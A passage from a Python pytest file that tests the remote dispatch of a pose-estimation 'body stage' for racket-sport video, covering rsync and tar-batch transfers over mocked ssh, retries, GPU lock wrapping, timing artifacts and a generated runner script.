    ]
    assert "body_mesh_index/" in synced
    assert (clip_dir / "body_mesh_index" / "body_mesh_index.json").is_file()


def test_body_input_artifacts_ship_placement_stance_and_calibration_inputs() -> None:
    assert "placement.json" in rbd.BODY_INPUT_ARTIFACTS
    assert "foot_contact_phases.json" in rbd.BODY_INPUT_ARTIFACTS
    assert "court_calibration.json" in rbd.BODY_INPUT_ARTIFACTS
    assert "camera_motion.json" in rbd.BODY_INPUT_ARTIFACTS


def test_rsync_up_syncs_optional_placement_and_foot_contact_inputs(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    _write_json(clip_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(clip_dir / "placement.json", _placement_payload())
    _write_json(clip_dir / "foot_contact_phases.json", {"schema_version": 1, "artifact_type": "foot_contact_phases", "phases": []})
    _write_json(
        clip_dir / "camera_motion.json",
        {
            "schema_version": 1,
            "artifact_type": "racketsport_camera_motion",
            "frames": [
                {
                    "frame_idx": 0,
                    "compensated": True,
                    "model": "homography",
                    "M": [[1.0, 0.0, 20.0], [0.0, 1.0, 0.0], [0.0, 0.0, 1.0]],
                }
            ],
        },
    )
    uploaded: list[str] = []
    rsync_commands: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            rsync_commands.append(list(cmd))
            uploaded.extend(_rsync_files_from_names(list(cmd)))
            return _completed(0)
        raise AssertionError(f"unexpected command: {cmd}")

    rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)

    assert len(rsync_commands) == 1
    assert "--files-from" in rsync_commands[0]
    assert "court_calibration.json" in uploaded
    assert "placement.json" in uploaded
    assert "foot_contact_phases.json" in uploaded
    assert "camera_motion.json" in uploaded
    assert "source.mp4" in uploaded
    assert "tracks.json" in uploaded


def test_rsync_up_batches_single_file_inputs_and_keeps_directories_separate(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    _write_json(clip_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(clip_dir / "placement.json", _placement_payload())
    body_frames = clip_dir / "body_frames"
    body_frames.mkdir()
    (body_frames / "frame_000000.jpg").write_bytes(b"frame")
    mask_dir = clip_dir / "sam3d_body_masks"
    mask_dir.mkdir()
    (mask_dir / "frame_000000_player_7.png").write_bytes(b"mask")
    rsync_commands: list[list[str]] = []
    files_from: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            command = list(cmd)
            rsync_commands.append(command)
            files_from.extend(_rsync_files_from_names(command))
            return _completed(0)
        raise AssertionError(f"unexpected command: {cmd}")

    synced = rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)

    assert len([cmd for cmd in rsync_commands if "--files-from" in cmd]) == 1
    assert len(rsync_commands) == 3
    assert {"source.mp4", "tracks.json", "court_calibration.json", "placement.json"}.issubset(set(files_from))
    assert "body_frames/" in synced
    assert "sam3d_body_masks/" in synced


def test_rsync_up_batch_failure_includes_rsync_stderr(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync" and "--files-from" in cmd:
            return _completed(12, stderr="ssh handshake failed")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="ssh handshake failed"):
        rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)


def test_rsync_up_does_not_sync_absent_camera_motion_input(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    _write_json(clip_dir / "court_calibration.json", _court_calibration_payload())
    uploaded: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            uploaded.extend(_rsync_files_from_names(list(cmd)))
            return _completed(0)
        raise AssertionError(f"unexpected command: {cmd}")

    rbd._rsync_up(clip_dir, clip_dir / "source.mp4", None, "/remote/run", rbd.RemoteConfig(), run=fake_run)

    assert "camera_motion.json" not in uploaded


def test_rsync_up_syncs_explicit_camera_motion_path_as_canonical_remote_name(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    external_motion = tmp_path / "sidecars" / "owner_camera_motion.json"
    _write_json(
        external_motion,
        {
            "schema_version": 1,
            "artifact_type": "racketsport_camera_motion",
            "frames": [
                {
                    "frame_idx": 0,
                    "compensated": True,
                    "model": "homography",
                    "M": [[1.0, 0.0, 20.0], [0.0, 1.0, 0.0], [0.0, 0.0, 1.0]],
                }
            ],
        },
    )
    uploaded: list[str] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "rsync":
            uploaded.extend(_rsync_files_from_names(list(cmd)))
            return _completed(0)
        raise AssertionError(f"unexpected command: {cmd}")

    rbd._rsync_up(
        clip_dir,
        clip_dir / "source.mp4",
        None,
        "/remote/run",
        rbd.RemoteConfig(),
        run=fake_run,
        camera_motion_path=external_motion,
    )

    assert "camera_motion.json" in uploaded
    assert "owner_camera_motion.json" not in uploaded


def test_tar_batch_transport_round_trips_245_file_payload_byte_identical_through_mocked_ssh_boundary(
    tmp_path: Path,
) -> None:
    """Wave-1 failed above ~100-244 files; tar-batch must handle a >=245-file payload."""

    clip_dir = _clip_dir_with_tracks(tmp_path)
    body_frames = clip_dir / "body_frames"
    body_frames.mkdir()
    for idx in range(245):
        (body_frames / f"frame_{idx:06d}.jpg").write_bytes(f"frame-payload-{idx}".encode("utf-8"))
    _write_json(clip_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(clip_dir / "placement.json", _placement_payload())

    remote_repo = tmp_path / "remote" / "repo"
    remote_run_dir = remote_repo / "runs" / "body" / "clip"
    remote_run_dir.mkdir(parents=True)
    config = rbd.RemoteConfig(host="mock@ssh", repo=str(remote_repo), transport="tar_batch")
    phases: dict[str, float] = {}
    commands: list[list[str]] = []

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        command = list(cmd)
        commands.append(command)
        if command[0] == "scp":
            source, dest = command[-2], command[-1]
            if ":" in dest:
                remote_tar = _scp_remote_path(dest)
                remote_tar.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(source, remote_tar)
            else:
                shutil.copy2(_scp_remote_path(source), dest)
            return _completed(0)
        if command[0] == "ssh":
            return _run_mocked_ssh_shell(command[-1])
        raise AssertionError(f"unexpected command: {command}")

    synced_inputs = rbd._tar_batch_up(
        clip_dir,
        clip_dir / "source.mp4",
        None,
        str(remote_run_dir),
        config,
        run=fake_run,
        phases=phases,
    )

    assert "body_frames/" in synced_inputs
    assert _tree_hashes(body_frames) == _tree_hashes(remote_run_dir / "body_frames")

    remote_index = remote_run_dir / "body_mesh_index"
    remote_index.mkdir()
    for idx in range(245):
        (remote_index / f"mesh_chunk_{idx:06d}.json").write_bytes(f"mesh-payload-{idx}".encode("utf-8"))
    _write_json(remote_run_dir / "skeleton3d.json", _sam3d_skeleton_payload())
    local_out = tmp_path / "download"

    synced_outputs = rbd._tar_batch_down(str(remote_run_dir), local_out, config, run=fake_run, phases=phases)

    assert "skeleton3d.json" in synced_outputs
    assert "body_mesh_index/" in synced_outputs
    assert _tree_hashes(remote_index) == _tree_hashes(local_out / "body_mesh_index")
    assert len([cmd for cmd in commands if cmd[0] == "scp" and ":" in cmd[-1]]) == 1
    assert len([cmd for cmd in commands if cmd[0] == "scp" and ":" in cmd[-2]]) == 1
    assert phases.keys() >= {
        "tar_create_upload_archive_s",
        "tar_upload_scp_s",
        "tar_remote_untar_s",
        "tar_remote_pack_s",
        "tar_download_scp_s",
        "tar_extract_outputs_s",
    }


def test_tar_batch_transport_retries_transient_upload_failure_with_backoff(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    remote_run_dir = tmp_path / "remote" / "run"
    remote_run_dir.mkdir(parents=True)
    config = rbd.RemoteConfig(
        host="mock@ssh",
        transport="tar_batch",
        transport_retry_max_attempts=3,
        transport_retry_backoff_s=0.25,
    )
    scp_attempts = 0
    sleeps: list[float] = []
    monkeypatch.setattr(rbd.time, "sleep", lambda seconds: sleeps.append(seconds))

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        nonlocal scp_attempts
        command = list(cmd)
        if command[0] == "scp":
            scp_attempts += 1
            if scp_attempts == 1:
                return _completed(255, stderr="ssh_packet_write_poll: Result too large")
            shutil.copy2(command[-2], _scp_remote_path(command[-1]))
            return _completed(0)
        if command[0] == "ssh":
            return _run_mocked_ssh_shell(command[-1])
        raise AssertionError(f"unexpected command: {command}")

    rbd._tar_batch_up(
        clip_dir,
        clip_dir / "source.mp4",
        None,
        str(remote_run_dir),
        config,
        run=fake_run,
        phases={},
    )

    assert scp_attempts == 2
    assert sleeps == [0.25]


def test_tar_batch_transport_bounds_permanent_retryable_failure_without_retry_storm(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    remote_run_dir = tmp_path / "remote" / "run"
    remote_run_dir.mkdir(parents=True)
    config = rbd.RemoteConfig(
        host="mock@ssh",
        transport="tar_batch",
        transport_retry_max_attempts=3,
        transport_retry_backoff_s=0.1,
    )
    scp_attempts = 0
    sleeps: list[float] = []
    monkeypatch.setattr(rbd.time, "sleep", lambda seconds: sleeps.append(seconds))

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        nonlocal scp_attempts
        if cmd[0] == "scp":
            scp_attempts += 1
            return _completed(255, stderr="ssh transport stayed broken")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="tar-batch upload archive failed after 3 attempts"):
        rbd._tar_batch_up(
            clip_dir,
            clip_dir / "source.mp4",
            None,
            str(remote_run_dir),
            config,
            run=fake_run,
            phases={},
        )

    assert scp_attempts == 3
    assert sleeps == [0.1, 0.1]


def test_dispatch_body_stage_tar_transport_records_transport_and_tar_phase_entries(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)
    body_frames = clip_dir / "body_frames"
    body_frames.mkdir()
    (body_frames / "frame_000000.jpg").write_bytes(b"frame")

    remote_repo = tmp_path / "remote" / "repo"
    remote_python = remote_repo / "body_runtime" / "body_venv" / "bin" / "python"
    remote_fast_sam_root = remote_repo / "body_runtime" / "Fast-SAM-3D-Body"
    remote_lock_script = remote_repo / "scripts" / "gpu-eval-run.sh"
    for path in (remote_python, remote_lock_script):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("#!/bin/sh\n", encoding="utf-8")
    remote_fast_sam_root.mkdir(parents=True)
    commands: list[list[str]] = []

    config = rbd.RemoteConfig(
        host="mock@ssh",
        repo=str(remote_repo),
        python=str(remote_python),
        fast_sam_python=str(remote_python),
        fast_sam_root=str(remote_fast_sam_root),
        transport="tar_batch",
        transport_retry_max_attempts=2,
        transport_retry_backoff_s=0.0,
    )

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        command = list(cmd)
        commands.append(command)
        if command[0] == "scp":
            source, dest = command[-2], command[-1]
            if ":" in dest:
                remote_tar = _scp_remote_path(dest)
                remote_tar.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(source, remote_tar)
            else:
                shutil.copy2(_scp_remote_path(source), dest)
            return _completed(0)
        if command[0] == "ssh":
            remote_cmd = command[-1]
            if rbd.REMOTE_BODY_RUNNER_FILENAME in remote_cmd and config.gpu_lock_script in remote_cmd:
                run_root = next(remote_repo.glob("runs/process_video_body_dispatch/wolverine_*"))
                _write_json(run_root / "skeleton3d.json", _sam3d_skeleton_payload())
                _write_json(run_root / "body_serialization_timing.json", {"artifact_type": "racketsport_body_serialization_timing"})
                _write_json(run_root / "body_stage_phase_timing.json", {"artifact_type": "racketsport_body_stage_phase_timing"})
                stdout = "\n".join(
                    [
                        json.dumps({"event": "script_start", "epoch_s": 1001.25}),
                        json.dumps({"event": "exit", "epoch_s": 1002.0, "exit_code": 0}),
                    ]
                )
                return _completed(0, stdout=stdout)
            return _run_mocked_ssh_shell(remote_cmd)
        raise AssertionError(f"unexpected command: {command}")

    result = rbd.dispatch_body_stage(
        clip="wolverine",
        clip_dir=clip_dir,
        video_path=clip_dir / "source.mp4",
        config=config,
        allow_dirty=True,
        run=fake_run,
    )

    timing = json.loads((clip_dir / "remote_body_dispatch_timing.json").read_text(encoding="utf-8"))
    assert result.status == "ran"
    assert timing["transport"] == "tar_batch"
    assert result.timing["transport"] == "tar_batch"
    assert timing["phases"].keys() >= {
        "preflight_s",
        "mkdir_s",
        "upload_s",
        "remote_command_s",
        "download_s",
        "tar_create_upload_archive_s",
        "tar_upload_scp_s",
        "tar_remote_untar_s",
        "tar_remote_pack_s",
        "tar_download_scp_s",
        "tar_extract_outputs_s",
    }
    assert "skeleton3d.json" in result.synced_outputs
    assert not any(cmd[0] == "rsync" for cmd in commands)


def test_body_stage_runner_engages_stance_grounding_from_dispatch_dir_fixture(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    dispatch_dir = tmp_path / "dispatch"
    dispatch_dir.mkdir()
    _write_json(dispatch_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(dispatch_dir / "tracks.json", _dispatch_tracks_payload())
    _write_json(dispatch_dir / "placement.json", _placement_payload())
    _write_json(dispatch_dir / "frame_compute_plan.json", _frame_compute_plan_payload())
    body_frames = dispatch_dir / "body_frames"
    body_frames.mkdir()
    (body_frames / "frame_000000.jpg").write_bytes(b"stub")
    monkeypatch.setattr(orchestrator, "_read_image_size", lambda _path: (1920, 1080))

    runner = BodyStageRunner(
        manifest_path=_body_manifest(tmp_path / "models"),
        runtime=_FakeFastSamRuntime(),
        detector_name="",
        fov_name="",
        tier2_body_joints_all_tracked=True,
        write_body_monoliths=True,
    )
    result = runner.run(
        StageContext(
            clip="wolverine",
            inputs_dir=dispatch_dir,
            run_dir=dispatch_dir,
            sport="pickleball",
            max_frames=1,
            expected_players=1,
        )
    )

    skeleton = json.loads((dispatch_dir / "skeleton3d.json").read_text(encoding="utf-8"))
    timing = json.loads((dispatch_dir / "body_serialization_timing.json").read_text(encoding="utf-8"))
    phase_timing = validate_artifact_file("body_stage_phase_timing", dispatch_dir / "body_stage_phase_timing.json")
    assert isinstance(phase_timing, BodyStagePhaseTiming)
    assert result.status == "ran"
    assert result.wall_seconds is not None
    assert result.metrics["grounding_anchor_source"] == "placement_track_world_xy"
    assert result.metrics["stance_aware_grounding"]["stance_frame_count"] == 1
    assert skeleton["provenance"]["grounding_anchor_source"] == "placement_track_world_xy"
    assert skeleton["provenance"]["stance_aware_grounding"] is True
    assert [item["artifact"] for item in timing["artifacts"]] == ["smpl_motion.json", "body_mesh.json"]
    assert all(item["bytes"] > 0 for item in timing["artifacts"])
    assert all(item["serialization_seconds"] >= 0.0 for item in timing["artifacts"])
    assert phase_timing.person_frame_count == 1
    assert phase_timing.serialization_s == pytest.approx(timing["summary"]["total_serialization_seconds"])
    assert phase_timing.other_s >= 0.0


def test_body_stage_runner_merges_subprocess_timing_and_builds_index_from_memory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    dispatch_dir = tmp_path / "dispatch"
    dispatch_dir.mkdir()
    _write_json(dispatch_dir / "court_calibration.json", _court_calibration_payload())
    _write_json(dispatch_dir / "tracks.json", _dispatch_tracks_payload())
    _write_json(dispatch_dir / "placement.json", _placement_payload())
    _write_json(dispatch_dir / "frame_compute_plan.json", _frame_compute_plan_payload())
    body_frames = dispatch_dir / "body_frames"
    body_frames.mkdir()
    (body_frames / "frame_000000.jpg").write_bytes(b"stub")
    monkeypatch.setattr(orchestrator, "_read_image_size", lambda _path: (1920, 1080))

    runner = BodyStageRunner(
        manifest_path=_body_manifest(tmp_path / "models"),
        runtime=_FakeBatchFastSamRuntime(dispatch_dir / "fast_sam_subprocess"),
        detector_name="",
        fov_name="",
        tier2_body_joints_all_tracked=True,
        sam3d_torch_compile=True,
        sam3d_compile_warmup_buckets=(8,),
    )
    result = runner.run(
        StageContext(
            clip="wolverine",
            inputs_dir=dispatch_dir,
            run_dir=dispatch_dir,
            sport="pickleball",
            max_frames=1,
            expected_players=1,
        )
    )

    phase_timing = validate_artifact_file("body_stage_phase_timing", dispatch_dir / "body_stage_phase_timing.json")
    assert isinstance(phase_timing, BodyStagePhaseTiming)
    assert result.status == "ran"
    assert phase_timing.model_load_s == pytest.approx(2.0)
    assert phase_timing.compile_warmup_s == pytest.approx(1.5)
    assert phase_timing.inference_s == pytest.approx(3.0)
    assert phase_timing.ms_per_person_steady == pytest.approx(3000.0)
    assert phase_timing.runner_preprocessing_s == pytest.approx(0.5)
    assert phase_timing.runner_result_serialization_handoff_s == pytest.approx(0.75)
    assert phase_timing.runner_other_s == pytest.approx(1.9)
    assert phase_timing.subprocess_outer_call_s is not None
    assert phase_timing.subprocess_wrapper_handoff_s is not None
    assert phase_timing.index_build_s is not None and phase_timing.index_build_s >= 0.0
    assert phase_timing.per_bucket_timing == [{"bucket_size": 8, "warmup_s": 1.5, "steady_s": 3.0, "frames": 1}]
    assert "model_load_s" not in phase_timing.not_instrumentable
    assert "compile_warmup_s" not in phase_timing.not_instrumentable
    assert (dispatch_dir / "body_mesh_index" / "body_mesh_index.json").is_file()
    assert "body_mesh_index/body_mesh_index.json" in result.produced_artifacts


def test_body_stage_runner_slim_mode_skips_monoliths_but_preserves_replay_artifacts(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monolith_dir = _body_dispatch_dir(tmp_path, name="monolith")
    slim_dir = _body_dispatch_dir(tmp_path, name="slim")
    monkeypatch.setattr(orchestrator, "_read_image_size", lambda _path: (1920, 1080))

    common_kwargs = {
        "manifest_path": _body_manifest(tmp_path / "models"),
        "detector_name": "",
        "fov_name": "",
        "tier2_body_joints_all_tracked": True,
    }
    monolith_result = BodyStageRunner(
        runtime=_FakeFastSamRuntime(),
        write_body_monoliths=True,
        **common_kwargs,
    ).run(
        StageContext(
            clip="wolverine",
            inputs_dir=monolith_dir,
            run_dir=monolith_dir,
            sport="pickleball",
            max_frames=1,
            expected_players=1,
        )
    )
    slim_result = BodyStageRunner(
        runtime=_FakeFastSamRuntime(),
        write_body_monoliths=False,
        **common_kwargs,
    ).run(
        StageContext(
            clip="wolverine",
            inputs_dir=slim_dir,
            run_dir=slim_dir,
            sport="pickleball",
            max_frames=1,
            expected_players=1,
        )
    )

    assert monolith_result.status == "ran"
    assert slim_result.status == "ran"
    assert (monolith_dir / "smpl_motion.json").is_file()
    assert (monolith_dir / "body_mesh.json").is_file()
    assert not (slim_dir / "smpl_motion.json").exists()
    assert not (slim_dir / "body_mesh.json").exists()
    assert (slim_dir / "skeleton3d.json").read_bytes() == (monolith_dir / "skeleton3d.json").read_bytes()
    slim_joint_quality = json.loads((slim_dir / "body_joint_quality.json").read_text(encoding="utf-8"))
    monolith_joint_quality = json.loads((monolith_dir / "body_joint_quality.json").read_text(encoding="utf-8"))
    for key in ("status", "usable_for_review", "world_joints_available", "summary", "quality_blockers", "warnings"):
        assert slim_joint_quality[key] == monolith_joint_quality[key]
    assert (slim_dir / "contact_splice.json").read_bytes() == (monolith_dir / "contact_splice.json").read_bytes()
    assert (slim_dir / "body_mesh_index" / "body_mesh_index.json").read_bytes() == (
        monolith_dir / "body_mesh_index" / "body_mesh_index.json"
    ).read_bytes()
    assert (slim_dir / "body_mesh_index" / "body_mesh_faces.json").read_bytes() == (
        monolith_dir / "body_mesh_index" / "body_mesh_faces.json"
    ).read_bytes()
    assert gzip.decompress((slim_dir / "body_mesh_index" / "body_mesh_chunks" / "window_000.bin.gz").read_bytes()) == gzip.decompress(
        (monolith_dir / "body_mesh_index" / "body_mesh_chunks" / "window_000.bin.gz").read_bytes()
    )
    slim_timing = json.loads((slim_dir / "body_serialization_timing.json").read_text(encoding="utf-8"))
    assert [item["artifact"] for item in slim_timing["artifacts"]] == ["smpl_motion.json", "body_mesh.json"]
    assert all(item["skipped"] is True for item in slim_timing["artifacts"])
    assert slim_timing["summary"]["skipped_count"] == 2
    readiness = json.loads((slim_dir / "body_mesh_readiness.json").read_text(encoding="utf-8"))
    assert readiness["monoliths"]["status"] == "not_built"
    assert "rerun with --fetch-body-monoliths" in readiness["monoliths"]["note"]
    assert "smpl_motion.json" not in slim_result.produced_artifacts
    assert "body_mesh.json" not in slim_result.produced_artifacts
    assert any("not built (speed default" in note for note in slim_result.notes)


def test_dispatch_body_stage_raises_when_no_outputs_synced(tmp_path: Path) -> None:
    clip_dir = _clip_dir_with_tracks(tmp_path)

    def fake_run(cmd, timeout_s):  # noqa: ANN001
        if cmd[0] == "ssh" and cmd[-1] == "true":
            return _completed(0)
        if cmd[0] == "ssh" and cmd[-1].startswith("mkdir"):
            return _completed(0)
        if _is_remote_output_listing(list(cmd)):
            return _completed(0, stdout="")
        if cmd[0] == "rsync":
            src = cmd[-2]
            is_upload = ":" in cmd[-1]
            if is_upload:
                return _completed(0)
            # download: remote has nothing to give back for any output artifact.
            return _completed(1, stderr="no such file")
        if cmd[0] == "ssh":
            return _completed(0, stdout="ran but wrote nothing useful")
        raise AssertionError(f"unexpected command: {cmd}")

    with pytest.raises(rbd.RemoteBodyDispatchError, match="produced no"):
        rbd.dispatch_body_stage(
            clip="wolverine",
            clip_dir=clip_dir,
            video_path=clip_dir / "source.mp4",
            config=rbd.RemoteConfig(transport="rsync"),
            allow_dirty=True,
            run=fake_run,
        )


def test_remote_command_wraps_with_shared_eval_lock_and_split_timeouts() -> None:
    config = rbd.RemoteConfig(lock_wait_timeout_s=42, command_timeout_s=1234)
    command = rbd._remote_body_command(remote_run_dir="/remote/run", config=config)
    # Task #46 timeout split: the lock wait is bounded via gpu-eval-run.sh's own
    # GPU_LOCK_TIMEOUT_S (exit 75), while the outer `timeout` is the generous
    # overall run budget (exit 124) -- NOT the lock-wait value, which used to
    # SIGKILL any real BODY run longer than 60s mid-inference.
    assert "GPU_LOCK_TIMEOUT_S=42" in command
    assert "timeout 1234s" in command
    assert "timeout 42s" not in command
    assert "RTMW3D_PROJECT_PYTHONPATH=" not in command


def test_phase_d_dispatch_config_documents_static_intrinsics_warmup_and_stall_gate() -> None:
    config = rbd.RemoteConfig(
        sam3d_crop_bucket_sizes=(8, 16),
        sam3d_torch_compile=True,
        sam3d_compile_warmup_buckets=(8, 16),
    )

    payload = rbd.build_phase_d_sam3d_dispatch_config(config)

    optimization = payload["optimization"]
    assert optimization["batching"] == "static_intrinsics_cross_frame_bucketed_body_batch"
    assert optimization["crop_bucket_sizes"] == [8, 16]
    assert optimization["torch_compile"] is True
    assert optimization["compile_warmup_buckets"] == [8, 16]
    assert optimization["compile_warmup_passes"] == 2
    assert optimization["steady_state_empty_cache"] is True
    assert optimization["inner_bucket_sync"] is True
    assert optimization["upstream_env"] == {}
    assert optimization["tier2_output_lite"] is False
    assert optimization["static_clip_intrinsics_contract"] == {
        "source_artifact": "court_calibration.json",
        "request_field": "clip_intrinsics",
        "batch_runner_kwarg": "clip_intrinsics",
        "shape": [1, 3, 3],
        "warmup_bucket_shapes_match_real_execution": True,
        "warmup_passes_per_shape": 2,
        "per_request_camera_intrinsics_policy": "must_match_or_error",
    }
    assert optimization["real_batched_execution"]["bucket_sizes_to_measure"] == [8, 16]
    assert payload["a100_stall_regression_check"]["max_first_measured_call_after_warmup_s"] == 1.0
    assert payload["a100_stall_regression_check"]["fails_if_first_call_exceeds_s"] == 2.0
    assert "hand-built forward_step batch" in payload["a100_stall_regression_check"]["guard_hypothesis"]
    assert "torch.inference_mode" in payload["a100_stall_regression_check"]["guard_hypothesis"]
    assert any(
        "batch_guard_signatures" in step
        for step in payload["a100_stall_regression_check"]["procedure"]
    )
    assert "process_one_image" not in json.dumps(payload["a100_stall_regression_check"])


def test_remote_body_dispatch_cli_help_direct_reference() -> None:
    command_path = "scripts/racketsport/remote_body_dispatch.py"

    completed = subprocess.run(
        [sys.executable, command_path, "--help"],
        check=True,
        capture_output=True,
        text=True,
    )

    assert "--clip" in completed.stdout
    assert "--sam3d-body-input-size-px" in completed.stdout
    assert "--sam3d-crop-bucket-sizes" in completed.stdout
    assert "--sam3d-compile-warmup-buckets" in completed.stdout
    assert "--sam3d-compile-warmup-passes" in completed.stdout
    assert "--no-sam3d-torch-compile" in completed.stdout
    assert "--serialize-tier2-mesh-vertices" in completed.stdout
    assert "--no-sam3d-steady-state-empty-cache" in completed.stdout
    assert "--no-sam3d-inner-bucket-sync" in completed.stdout
    assert "--sam3d-upstream-env" in completed.stdout
    assert "--sam3d-tier2-output-lite" in completed.stdout
    assert "--camera-motion" in completed.stdout
    assert "--fetch-body-monoliths" in completed.stdout
    assert "--allow-dirty" in completed.stdout
    assert "--sync-remote-code" in completed.stdout
    assert "--verify-version-stamp" in completed.stdout
    assert "--transport" in completed.stdout
    assert "tar_batch" in completed.stdout
    assert "rsync" in completed.stdout
    config = rbd.RemoteConfig(lock_wait_timeout_s=42, command_timeout_s=1234)
    command = rbd._remote_body_command(remote_run_dir="/remote/run", config=config)
    assert config.gpu_lock_script in command
    assert "gpu-train-lock" not in command  # must use the shared eval lock, never the exclusive training lock
    assert "/remote/run/remote_body_runner.py" in command
    assert "RTMW3D_PROJECT_PYTHONPATH=" not in command


def test_remote_body_runner_script_registers_vm_proven_body_configuration() -> None:
    """Task #46: the generated remote runner must register a BodyStageRunner
    with the VM1-proven detector/fov configuration (both disabled -- the only
    configuration that has produced real meshes on VM1, since the moge FOV
    checkpoint does not exist on that host) and gate its exit code on the BODY
    stage's own StageRun status, not run_pipeline's aggregate status."""

    config = rbd.RemoteConfig()
    script = rbd._remote_body_runner_script(
        clip="wolverine", remote_run_dir="/remote/run", config=config, max_frames=50, max_players=4
    )

    assert 'stage="body"' in script
    assert "max_frames=50" in script
    assert "max_players=4" in script
    assert "detector_name=''" in script
    assert "fov_name=''" in script
    assert 'tracking_mode="precomputed_tracks"' in script
    assert "body_ran" in script
    # a real Lane A skeleton with zero tier-rule-scheduled mesh frames is a
    # legitimate skeleton-level success (exit 0), never a fabricated mesh.
    assert "skeleton_level_only" in script
    assert "pose_ran" not in script
    assert "adaptive BODY schedule contains no SAM3D body-mode frames" in script
    assert "no world_mesh frames" not in script
    assert "os.chdir('/remote/run')" in script
    assert '_emit_marker("script_start")' in script
    assert '_emit_marker("imports_done")' in script
    assert '_emit_marker("run_pipeline_done"' in script
    assert "build_body_mesh_index" in script
    assert "body_mesh_index/body_mesh_index.json" in script
    assert "orchestrator_in_memory" in script
    assert "body_mesh_index already exists" in script
    assert '_emit_marker("mesh_index_done"' in script
    assert '_emit_marker("mesh_index_skipped"' in script
    assert '"mesh_index": "failed"' in script
    assert '_emit_marker("exit"' in script
    # the script must compile as valid python.
    compile(script, "remote_body_runner.py", "exec")


def test_remote_body_runner_reuses_shipped_calibration_and_tracking_artifacts() -> None:
    script = rbd._remote_body_runner_script(
        clip="wolverine", remote_run_dir="/remote/run", config=rbd.RemoteConfig(), max_frames=None, max_players=4
    )

    assert "reuse_existing_stage_artifacts=True" in script
    assert '"source_artifact": "court_calibration.json"' in script
    assert 'tracking_mode="precomputed_tracks"' in script
    compile(script, "remote_body_runner.py", "exec")


def test_remote_body_success_flags_accept_real_sam3d_skeleton_only_body_status() -> None:
    summary = {
        "status": "blocked",
        "stages": [
            {"stage": "calibration", "status": "ran", "notes": []},
            {"stage": "tracking", "status": "ran", "notes": []},
            {
                "stage": "body",
                "status": "failed",
                "notes": ["adaptive BODY schedule contains no SAM3D body-mode frames"],
            },
        ],
    }

    flags = rbd._remote_body_success_flags(summary, skeleton_exists=True)

    assert flags["body_ran"] is False
    assert flags["skeleton_level_only"] is True
    assert flags["no_sam3d_body_mode_frames"] is True
    assert flags["requires_pose_stage"] is False


def test_remote_body_runner_script_wires_sam3d_tier2_bench_config() -> None:
    config = rbd.RemoteConfig(
        sam3d_body_input_size_px=512,
        sam3d_crop_bucket_sizes=(8, 16),
        sam3d_crop_padding_scale=1.35,
        sam3d_mask_prompt_mode="manifest",
        sam3d_soft_background_alpha=0.65,
        sam3d_torch_compile=True,
        sam3d_compile_warmup_buckets=(8, 16),
        sam3d_skip_tier2_mesh_vertices=True,
        sam3d_steady_state_empty_cache=False,
        sam3d_inner_bucket_sync=False,
        sam3d_upstream_env={"USE_COMPILE_BACKBONE": "1", "MHR_NO_CORRECTIVES": "1"},
        sam3d_tier2_output_lite=True,
    )

    script = rbd._remote_body_runner_script(
        clip="wolverine", remote_run_dir="/remote/run", config=config, max_frames=None, max_players=4
    )

    assert "tier2_body_joints_all_tracked=True" in script
    assert "mesh_vertex_serialization_policy='tier1_only'" in script
    assert "sam3d_body_input_size_px=512" in script
    assert "sam3d_crop_bucket_sizes=(8, 16)" in script
    assert "sam3d_crop_padding_scale=1.35" in script
    assert "sam3d_mask_prompt_mode='manifest'" in script
    assert "sam3d_soft_background_alpha=0.65" in script
    assert "sam3d_torch_compile=True" in script
    assert "sam3d_compile_warmup_buckets=(8, 16)" in script
    assert "sam3d_compile_warmup_passes=2" in script
    assert "sam3d_steady_state_empty_cache=False" in script
    assert "sam3d_inner_bucket_sync=False" in script
    assert "sam3d_upstream_env={'USE_COMPILE_BACKBONE': '1', 'MHR_NO_CORRECTIVES': '1'}" in script
    assert "sam3d_tier2_output_lite=True" in script
    assert '"source": "sam3d_tier2_impl_20260703T0xZ"' in script
    assert '"phase_d_source": "phase_d_speed_opt_20260703T0xZ"' in script
    assert '"source": "sam3d_accuracy_opt_20260703T0xZ"' in script
    assert '"steady_state_empty_cache": false' in script
